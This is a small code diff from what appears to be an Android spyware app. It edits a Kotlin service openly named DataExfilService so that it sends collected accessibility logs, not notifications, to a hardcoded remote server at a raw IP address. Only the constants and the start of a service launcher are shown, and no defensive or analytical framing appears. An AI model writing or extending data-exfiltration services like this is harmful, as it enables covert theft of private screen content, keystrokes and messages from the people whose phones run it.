@@ -26,7 +26,7 @@ class DataExfilService : Service() {
         const val TAG = "DataExfilService"
         private const val NOTIFICATION_CHANNEL_ID = "data_exfil_channel"
         private const val NOTIFICATION_ID = 1001
-        private const val SERVER_ENDPOINT = "http://20.2.92.176:5000/notifications"
+        private const val SERVER_ENDPOINT = "http://20.2.92.176:5000/accessibility_logs"
 
         fun startService(context: Context) {
             val intent = Intent(context, DataExfilService::class.java)
